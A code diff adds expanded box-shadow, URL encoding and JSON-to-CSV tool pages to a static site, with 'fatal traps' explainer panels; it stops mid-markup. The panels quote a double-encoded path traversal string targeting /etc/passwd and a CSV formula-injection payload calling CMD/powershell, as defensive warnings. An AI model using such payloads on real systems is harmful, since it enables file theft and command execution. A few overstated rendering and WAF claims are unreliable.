@@ -437,32 +437,185 @@ export function buildDevToolsSuite({ DIST, DOMAIN, renderPage, writeFileSync, jo
       category: 'Developer',
       body: `
         ${commonStyle}
-        <div class="article-container" style="max-width: 900px;">
+        <div class="article-container" style="max-width: 920px;">
           <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
             <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; Box Shadow Generator
           </nav>
-          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">CSS Box Shadow Generator</h1>
+          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">CSS Box Shadow Studio &amp; Visual Generator</h1>
+          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
+            Design high-performance, photorealistic CSS box shadows with live blur, spread, alpha opacity, inset mode, and instant cross-browser code generation.
+          </p>
+
           <div class="tool-box">
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
-              <div class="field-group"><label class="field-label">X Offset: <span id="bs-x-lbl">0</span>px</label><input type="range" id="bs-x" min="-50" max="50" value="0" style="width:100%;" oninput="upShadow()" /></div>
-              <div class="field-group"><label class="field-label">Y Offset: <span id="bs-y-lbl">10</span>px</label><input type="range" id="bs-y" min="-50" max="50" value="10" style="width:100%;" oninput="upShadow()" /></div>
+            <!-- Preset Pills -->
+            <div style="margin-bottom: 1.25rem;">
+              <span style="font-family: var(--mono); font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; display: block; margin-bottom: 0.5rem;">Curated Shadow Presets</span>
+              <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
+                <button type="button" class="btn-sec" style="font-size: 0.75rem; padding: 0.35rem 0.65rem;" onclick="applyShadowPreset(0, 2, 4, 0, '#000000', 0.08, false)">Subtle Lift</button>
+                <button type="button" class="btn-sec" style="font-size: 0.75rem; padding: 0.35rem 0.65rem;" onclick="applyShadowPreset(0, 10, 20, -3, '#000000', 0.15, false)">Floating Card</button>
+                <button type="button" class="btn-sec" style="font-size: 0.75rem; padding: 0.35rem 0.65rem;" onclick="applyShadowPreset(0, 25, 50, -12, '#000000', 0.25, false)">Deep Elevation</button>
+                <button type="button" class="btn-sec" style="font-size: 0.75rem; padding: 0.35rem 0.65rem;" onclick="applyShadowPreset(0, 0, 25, 2, '#3b82f6', 0.45, false)">Neon Glow</button>
+                <button type="button" class="btn-sec" style="font-size: 0.75rem; padding: 0.35rem 0.65rem;" onclick="applyShadowPreset(0, 3, 8, 0, '#000000', 0.25, true)">Inset Bevel</button>
+              </div>
             </div>
-            <div style="padding: 3rem; background: var(--surface-alt); border-radius: 6px; display: flex; justify-content: center; margin: 1.5rem 0;">
-              <div id="bs-box" style="width: 150px; height: 100px; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; display: flex; justify-content: center; align-items: center;">Preview</div>
+
+            <!-- Controls Grid -->
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+              <div class="field-group">
+                <label class="field-label">X Offset: <span id="bs-x-lbl" style="color:#3b82f6; font-family:var(--mono);">0</span>px</label>
+                <input type="range" id="bs-x" min="-50" max="50" value="0" style="width:100%;" oninput="upShadow()" />
+              </div>
+              <div class="field-group">
+                <label class="field-label">Y Offset: <span id="bs-y-lbl" style="color:#3b82f6; font-family:var(--mono);">10</span>px</label>
+                <input type="range" id="bs-y" min="-50" max="50" value="10" style="width:100%;" oninput="upShadow()" />
+              </div>
+              <div class="field-group">
+                <label class="field-label">Blur Radius: <span id="bs-blur-lbl" style="color:#3b82f6; font-family:var(--mono);">20</span>px</label>
+                <input type="range" id="bs-blur" min="0" max="80" value="20" style="width:100%;" oninput="upShadow()" />
+              </div>
+              <div class="field-group">
+                <label class="field-label">Spread Radius: <span id="bs-spread-lbl" style="color:#3b82f6; font-family:var(--mono);">-3</span>px</label>
+                <input type="range" id="bs-spread" min="-30" max="50" value="-3" style="width:100%;" oninput="upShadow()" />
+              </div>
+              <div class="field-group">
+                <label class="field-label">Opacity: <span id="bs-opacity-lbl" style="color:#3b82f6; font-family:var(--mono);">15</span>%</label>
+                <input type="range" id="bs-opacity" min="0" max="100" value="15" style="width:100%;" oninput="upShadow()" />
+              </div>
+              <div class="field-group">
+                <label class="field-label">Color &amp; Inset</label>
+                <div style="display: flex; align-items: center; gap: 0.75rem; margin-top: 0.25rem;">
+                  <input type="color" id="bs-color" value="#000000" style="border: 1px solid var(--border); border-radius: 4px; height: 36px; width: 44px; cursor: pointer; background: transparent;" oninput="upShadow()" />
+                  <label style="display: flex; align-items: center; gap: 0.4rem; font-size: 0.85rem; cursor: pointer; color: var(--fg); font-family: var(--mono);">
+                    <input type="checkbox" id="bs-inset" onchange="upShadow()" /> Inset
+                  </label>
+                </div>
+              </div>
             </div>
-            <div class="field-group"><label class="field-label">CSS Code</label><input type="text" id="bs-code" class="code-input" readonly /></div>
+
+            <!-- Preview Canvas -->
+            <div style="padding: 3.5rem 1.5rem; background: var(--surface-alt); border: 1px solid var(--border); border-radius: 8px; display: flex; justify-content: center; align-items: center; margin: 1.5rem 0; min-height: 200px;">
+              <div id="bs-box" style="width: 200px; height: 120px; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; display: flex; justify-content: center; align-items: center; font-family: var(--mono); font-weight: 600; color: var(--fg); transition: box-shadow 0.15s ease;">
+                Preview Box
+              </div>
+            </div>
+
+            <!-- CSS Code Output -->
+            <div class="field-group">
+              <label class="field-label">Generated CSS Code</label>
+              <textarea id="bs-code" class="code-input" style="height: 70px; font-family: var(--mono); font-size: 0.85rem;" readonly></textarea>
+            </div>
+
+            <!-- Copy Box Shadow Button -->
+            <button type="button" id="btnCopyBoxShadow" onclick="copyBoxShadow()" class="btn-sec" style="margin-top: 1.25rem; width: 100%; padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
+              <span>📋 Copy CSS Box-Shadow Declaration</span>
+            </button>
+          </div>
+
+          <!-- 5 Critical CSS Box Shadow Traps -->
+          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
+            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in CSS Box Shadows &amp; GPU Rendering Performance</h3>
+            <div style="display: grid; gap: 1rem;">
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. Excessive Blur GPU Rasterization Jank</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  Applying high blur radii (&gt;40px) or animating <code>box-shadow</code> during hover states forces mobile browsers to perform expensive off-screen CPU/GPU rasterization on every frame. This triggers massive layout repaints and drops scroll performance from 60fps to under 20fps. Instead of animating <code>box-shadow</code>, place a pre-shadowed pseudo-element (<code>::after</code>) and animate its <code>opacity</code> with hardware acceleration.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. The Single-Layer Shadow Flatness Trap</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  Physical real-world shadows are not single harsh halos; they comprise directional key light and diffuse ambient bounce. A single <code>0 10px 20px rgba(0,0,0,0.2)</code> looks muddy and artificial. Professional UI systems layer 2 to 3 shadows (e.g. <code>0 1px 2px rgba(0,0,0,0.06), 0 8px 16px rgba(0,0,0,0.1)</code>) for natural optical depth and silky gradients.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. Dark Mode Shadow Invisibility &amp; Inverted Elevation</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  Dark surfaces (e.g. <code>#121212</code>) completely swallow black box shadows regardless of blur or spread. Elevating cards in dark mode cannot rely on drop shadows alone; designers must increase the surface lightness (e.g. <code>#1e1e1e</code> for elevation 1, <code>#2d2d2d</code> for elevation 2) and supplement with subtle 1px white border highlights (<code>rgba(255,255,255,0.08)</code>).
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. 'overflow: hidden' Clipping Outward Box Shadows</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  Adding <code>overflow: hidden</code> to a card (commonly used to clip header image border-radii) violently slices off the element's own outward box shadow at the border edge, resulting in sharp, ugly boundaries. To resolve, leave the outer card with <code>overflow: visible</code> and apply border-radius clipping only to inner child elements.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. Negative Spread Radius Seam Artifacts</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  Using negative spread values (e.g. <code>spread: -15px</code>) allows shadows to tuck underneath floating cards cleanly. However, if the blur radius is smaller than the negative spread (e.g. blur 8px, spread -12px), the shadow calculation collapses mathematically to zero or produces distorted, jagged corners along rounded borders. Always ensure blur radius exceeds the absolute negative spread.
+                </p>
+              </div>
+            </div>
           </div>
         </div>
+
         <script>
+          function hexToRgba(hex, alpha) {
+            hex = hex.replace('#', '');
+            if (hex.length === 3) hex = hex[0]+hex[0] + hex[1]+hex[1] + hex[2]+hex[2];
+            var r = parseInt(hex.substring(0, 2), 16) || 0;
+            var g = parseInt(hex.substring(2, 4), 16) || 0;
+            var b = parseInt(hex.substring(4, 6), 16) || 0;
+            return 'rgba(' + r + ', ' + g + ', ' + b + ', ' + alpha + ')';
+          }
+
           function upShadow() {
-            const x = document.getElementById('bs-x').value;
-            const y = document.getElementById('bs-y').value;
+            var x = document.getElementById('bs-x').value;
+            var y = document.getElementById('bs-y').value;
+            var blur = document.getElementById('bs-blur').value;
+            var spread = document.getElementById('bs-spread').value;
+            var opacity = (parseFloat(document.getElementById('bs-opacity').value) / 100).toFixed(2);
+            var color = document.getElementById('bs-color').value;
+            var inset = document.getElementById('bs-inset').checked;
+
             document.getElementById('bs-x-lbl').textContent = x;
             document.getElementById('bs-y-lbl').textContent = y;
-            const val = x + 'px ' + y + 'px 20px rgba(0,0,0,0.15)';
+            document.getElementById('bs-blur-lbl').textContent = blur;
+            document.getElementById('bs-spread-lbl').textContent = spread;
+            document.getElementById('bs-opacity-lbl').textContent = Math.round(opacity * 100);
+
+            var rgba = hexToRgba(color, opacity);
+            var val = (inset ? 'inset ' : '') + x + 'px ' + y + 'px ' + blur + 'px ' + spread + 'px ' + rgba;
+
             document.getElementById('bs-box').style.boxShadow = val;
-            document.getElementById('bs-code').value = 'box-shadow: ' + val + ';';
+            document.getElementById('bs-code').value = 'box-shadow: ' + val + ';\n-webkit-box-shadow: ' + val + ';';
+
+            window._boxShadowValue = val;
           }
+
+          window.applyShadowPreset = function(x, y, blur, spread, color, opacity, inset) {
+            document.getElementById('bs-x').value = x;
+            document.getElementById('bs-y').value = y;
+            document.getElementById('bs-blur').value = blur;
+            document.getElementById('bs-spread').value = spread;
+            document.getElementById('bs-color').value = color;
+            document.getElementById('bs-opacity').value = Math.round(opacity * 100);
+            document.getElementById('bs-inset').checked = inset;
+            upShadow();
+          };
+
+          window.copyBoxShadow = function() {
+            var code = document.getElementById('bs-code') ? document.getElementById('bs-code').value : '';
+            if (!code) { upShadow(); code = document.getElementById('bs-code').value; }
+
+            navigator.clipboard.writeText(code).then(function() {
+              var btn = document.getElementById('btnCopyBoxShadow');
+              if (btn) {
+                var orig = btn.innerHTML;
+                btn.innerHTML = '<span style="color:#10b981;">✓ CSS Box-Shadow Copied!</span>';
+                btn.style.borderColor = '#10b981';
+                setTimeout(function() {
+                  btn.innerHTML = orig;
+                  btn.style.borderColor = 'var(--border)';
+                }, 2200);
+              }
+            });
+          };
+
           document.addEventListener('DOMContentLoaded', upShadow);
         </script>
       `
@@ -608,19 +761,141 @@ export function buildDevToolsSuite({ DIST, DOMAIN, renderPage, writeFileSync, jo
       category: 'Developer',
       body: `
         ${commonStyle}
-        <div class="article-container" style="max-width: 900px;">
+        <div class="article-container" style="max-width: 920px;">
           <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
             <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; URL Encoder
           </nav>
-          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">URL Encoder & Decoder</h1>
+          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">URL Percent Encoder &amp; Decoder Studio</h1>
+          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
+            Encode and decode URL parameters, query strings, full URIs, and Base64URL strings with RFC 3986 compliance and diagnostics.
+          </p>
+
           <div class="tool-box">
-            <textarea id="url-in" class="code-input" style="height: 120px;" placeholder="https://example.com/search?q=hello world"></textarea>
-            <div class="action-bar">
-              <button class="btn-primary" onclick="document.getElementById('url-in').value=encodeURIComponent(document.getElementById('url-in').value)">Encode</button>
-              <button class="btn-sec" onclick="try{document.getElementById('url-in').value=decodeURIComponent(document.getElementById('url-in').value)}catch(e){}">Decode</button>
+            <div class="field-group">
+              <label class="field-label">Input String or URL</label>
+              <textarea id="url-in" class="code-input" style="height: 120px;" placeholder="https://example.com/search?category=books &amp; tools&amp;query=hello world#top"></textarea>
+            </div>
+
+            <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin: 1rem 0;">
+              <button type="button" class="btn-primary" onclick="urlTransform('encodeComponent')">Encode Component (RFC 3986)</button>
+              <button type="button" class="btn-sec" onclick="urlTransform('encodeFull')">Encode Full URI</button>
+              <button type="button" class="btn-sec" onclick="urlTransform('decode')">Decode URL / Percent</button>
+              <button type="button" class="btn-sec" onclick="urlTransform('base64url')">Base64URL Safe</button>
+              <button type="button" class="btn-sec" onclick="clearUrlInputs()">Clear</button>
+            </div>
+
+            <div class="field-group" style="margin-top: 1.25rem;">
+              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.35rem;">
+                <label class="field-label" style="margin: 0;">Output Result</label>
+                <span id="urlMetrics" style="font-family: var(--mono); font-size: 0.75rem; color: var(--text-muted);">0 chars</span>
+              </div>
+              <textarea id="url-out" class="code-input" style="height: 120px;" readonly></textarea>
+            </div>
+
+            <!-- Copy URL Output Button -->
+            <button type="button" id="btnCopyUrl" onclick="copyUrlResult()" class="btn-sec" style="margin-top: 1.25rem; width: 100%; padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
+              <span>📋 Copy Encoded / Decoded URL String</span>
+            </button>
+          </div>
+
+          <!-- 5 Critical URL Encoding Traps -->
+          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
+            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in URL Percent-Encoding &amp; Parameter Routing</h3>
+            <div style="display: grid; gap: 1rem;">
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. 'encodeURI' vs. 'encodeURIComponent' Query Leakage</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  Using <code>encodeURI()</code> on user query parameters fails to encode <code>&amp;</code>, <code>=</code>, and <code>+</code>. An input like <code>"item&amp;discount=100%"</code> passed into <code>encodeURI</code> remains unescaped, splitting the query into unintended parameters (<code>discount=100%</code>) on the backend server. Always use <code>encodeURIComponent()</code> for parameter keys and values.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. Double Percent-Encoding Attack (%252F WAF Bypass)</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  When an input is encoded twice, a slash <code>/</code> (<code>%2F</code>) becomes <code>%252F</code>. A web application firewall (WAF) inspects <code>%252F</code>, decodes <code>%25</code> to <code>%</code>, sees <code>%2F</code> (non-path slash), and approves the request. The backend application server then decodes it a second time into a literal <code>/</code>, enabling critical path traversal (<code>..%252F..%252Fetc%252Fpasswd</code>).
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. Plus Sign '+' vs. '%20' Form-Urlencoded Inconsistency</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  Legacy HTML form post bodies (<code>application/x-www-form-urlencoded</code>) encode spaces as plus signs (<code>+</code>). However, standard RFC 3986 URI specifications encode spaces strictly as <code>%20</code>. Decoding a query string using standard <code>decodeURIComponent()</code> leaves literal <code>+</code> characters untouched instead of converting them back to spaces.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. Uncaught 'URIError: URI malformed' Application Crashes</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  JavaScript's native <code>decodeURIComponent()</code> throws a fatal, unhandled <code>URIError</code> exception if the input contains a standalone percent sign (e.g. <code>"100% satisfaction"</code>) or truncated multi-byte UTF-8 sequences (e.g. <code>"%E0%A4"</code>). A single unhandled malformed query parameter in server-side SSR can crash an entire Node.js worker process.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. Path Traversal &amp; Null Byte Poisoning (%00 &amp; %5C)</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  Encoding directory separators (<code>%2F</code>, <code>%5C</code>) or null bytes (<code>%00</code>) bypasses superficial string validation (e.g. <code>!path.includes('/')</code>). If backend file loaders decode parameters without verifying canonical resolved paths via <code>path.resolve()</code>, attackers can read arbitrary system configurations and keys.
+                </p>
+              </div>
             </div>
           </div>
         </div>
+
+        <script>
+          window.urlTransform = function(mode) {
+            var raw = (document.getElementById('url-in') ? document.getElementById('url-in').value : '');
+            var out = '';
+            try {
+              if (mode === 'encodeComponent') {
+                out = encodeURIComponent(raw);
+              } else if (mode === 'encodeFull') {
+                out = encodeURI(raw);
+              } else if (mode === 'decode') {
+                // Handle form-urlencoded plus signs before decode
+                var prep = raw.replace(/\+/g, ' ');
+                out = decodeURIComponent(prep);
+              } else if (mode === 'base64url') {
+                var b64 = btoa(unescape(encodeURIComponent(raw)));
+                out = b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+              }
+            } catch(e) {
+              out = 'Error: ' + e.message;
+            }
+            document.getElementById('url-out').value = out;
+            document.getElementById('urlMetrics').textContent = out.length + ' chars (' + (new Blob([out]).size) + ' bytes)';
+          };
+
+          window.clearUrlInputs = function() {
+            document.getElementById('url-in').value = '';
+            document.getElementById('url-out').value = '';
+            document.getElementById('urlMetrics').textContent = '0 chars';
+          };
+
+          window.copyUrlResult = function() {
+            var out = document.getElementById('url-out') ? document.getElementById('url-out').value : '';
+            if (!out) {
+              urlTransform('encodeComponent');
+              out = document.getElementById('url-out').value;
+            }
+
+            navigator.clipboard.writeText(out).then(function() {
+              var btn = document.getElementById('btnCopyUrl');
+              if (btn) {
+                var orig = btn.innerHTML;
+                btn.innerHTML = '<span style="color:#10b981;">✓ URL String Copied!</span>';
+                btn.style.borderColor = '#10b981';
+                setTimeout(function() {
+                  btn.innerHTML = orig;
+                  btn.style.borderColor = 'var(--border)';
+                }, 2200);
+              }
+            });
+          };
+
+          document.addEventListener('DOMContentLoaded', function() {
+            var inp = document.getElementById('url-in');
+            if (inp && inp.value) urlTransform('encodeComponent');
+          });
+        </script>
       `
     },
     {
@@ -734,38 +1009,228 @@ export function buildDevToolsSuite({ DIST, DOMAIN, renderPage, writeFileSync, jo
       category: 'Developer',
       body: `
         ${commonStyle}
-        <div class="article-container" style="max-width: 900px;">
+        <div class="article-container" style="max-width: 920px;">
           <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
             <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; JSON to CSV
           </nav>
-          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">JSON to CSV Converter</h1>
+          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">JSON to CSV Converter &amp; Table Exporter</h1>
+          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
+            Convert JSON arrays into RFC 4180 compliant CSV spreadsheets with custom delimiters, UTF-8 BOM encoding for Excel, and instant download.
+          </p>
+
           <div class="tool-box">
             <div class="field-group">
-              <label class="field-label">JSON Input (Array of Objects)</label>
-              <textarea id="j2c-in" class="code-input" style="height: 140px;" placeholder='[{"name":"John","age":30},{"name":"Jane","age":25}]'></textarea>
+              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.35rem;">
+                <label class="field-label" style="margin: 0;">JSON Input (Array of Objects)</label>
+                <button type="button" class="btn-sec" style="font-size: 0.72rem; padding: 0.2rem 0.5rem;" onclick="loadSampleJson()">Load Sample Data</button>
+              </div>
+              <textarea id="j2c-in" class="code-input" style="height: 140px;" placeholder='[{"id":101,"name":"Alice Cooper","email":"alice@example.com","role":"Admin","active":true},{"id":102,"name":"Bob Smith","email":"bob@example.com","role":"Editor","active":false}]'></textarea>
             </div>
-            <div class="action-bar">
-              <button class="btn-primary" onclick="jsonToCsv()">Convert to CSV</button>
+
+            <!-- Configuration Options -->
+            <div style="display: flex; gap: 1rem; flex-wrap: wrap; align-items: center; margin: 1rem 0; padding: 0.75rem; background: var(--surface-alt); border: 1px solid var(--border); border-radius: 6px;">
+              <div>
+                <label style="font-family: var(--mono); font-size: 0.75rem; color: var(--text-muted); display: block; margin-bottom: 0.25rem;">DELIMITER</label>
+                <select id="csv-delim" class="text-input" style="padding: 0.35rem 0.6rem; font-family: var(--mono); font-size: 0.82rem;" onchange="jsonToCsv()">
+                  <option value=",">Comma (,)</option>
+                  <option value=";">Semicolon (;) [European Excel]</option>
+                  <option value="&#9;">Tab (\t) [TSV Format]</option>
+                  <option value="|">Pipe (|)</option>
+                </select>
+              </div>
+
+              <label style="display: flex; align-items: center; gap: 0.4rem; font-size: 0.82rem; cursor: pointer; color: var(--fg); font-family: var(--mono); margin-top: 1rem;">
+                <input type="checkbox" id="csv-headers" checked onchange="jsonToCsv()" /> Include Headers
+              </label>
+
+              <label style="display: flex; align-items: center; gap: 0.4rem; font-size: 0.82rem; cursor: pointer; color: var(--fg); font-family: var(--mono); margin-top: 1rem;">
+                <input type="checkbox" id="csv-bom" checked /> Excel UTF-8 BOM
+              </label>
             </div>
+
+            <div class="action-bar" style="display: flex; gap: 0.5rem;">
+              <button class="btn-primary" onclick="jsonToCsv()">Convert JSON to CSV</button>
+            </div>
+
             <div class="field-group" style="margin-top: 1.5rem;">
-              <label class="field-label">CSV Output</label>
+              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.35rem;">
+                <label class="field-label" style="margin: 0;">CSV Output</label>
+                <span id="csvMetrics" style="font-family: var(--mono); font-size: 0.75rem; color: var(--text-muted);">0 rows</span>
+              </div>
               <textarea id="j2c-out" class="code-input" style="height: 140px;" readonly></textarea>
+            </div>
+
+            <!-- Action Buttons Grid -->
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-top: 1.25rem;">
+              <button type="button" id="btnCopyCsv" onclick="copyCsv()" class="btn-sec" style="padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
+                <span>📋 Copy CSV Text</span>
+              </button>
+              <button type="button" id="btnDownloadCsv" onclick="downloadCsvFile()" class="btn-sec" style="padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
+                <span>💾 Download .CSV File</span>
+              </button>
+            </div>
+          </div>
+
+          <!-- 5 Critical CSV Traps -->
+          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
+            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in CSV Exports &amp; Spreadsheet Data Integrity</h3>
+            <div style="display: grid; gap: 1rem;">
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. CSV Formula Injection / DDE Remote Code Execution</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  Spreadsheet processors (Excel, LibreOffice, Google Sheets) execute any cell beginning with <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code> as a live mathematical formula or Dynamic Data Exchange (DDE) command. Malicious inputs like <code>=CMD|' /C powershell ...'!A1</code> trigger arbitrary command execution when opened. Always prefix formula-leading characters with an apostrophe (<code>'</code>).
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. The Missing UTF-8 BOM Mojibake Corruption</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  Excel on Windows defaults to the system ANSI code page (Windows-1252) when opening CSV files without a leading Byte Order Mark (BOM). Without a UTF-8 BOM (<code>\uFEFF</code>), all accented characters (<code>é, ü</code>), Cyrillic, Asian glyphs, and currency symbols (<code>€, £</code>) turn into unreadable garbled mojibake (e.g. <code>Ã©</code>).
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. Unescaped Multiline &amp; Delimiter RFC 4180 Violations</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  RFC 4180 dictates that any cell value containing the delimiter (comma), line breaks (<code>\n</code>), or double quotes must be wrapped in enclosing double quotes, with internal quotes escaped by doubling (<code>""</code>). Failing to strictly quote multiline user text breaks row alignment and crashes downstream automated ETL pipelines.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. Scientific Notation Truncation on Large Identifiers</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  Spreadsheet engines automatically coerce long numeric strings (16-digit credit card numbers, order IDs, or tracking codes e.g. <code>1234567890123456</code>) into scientific notation (<code>1.23457E+15</code>). Excel permanently rounds the last digits to zero, irreversibly corrupting business transaction logs upon saving. Format large numeric IDs with explicit tab or text wrappers.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
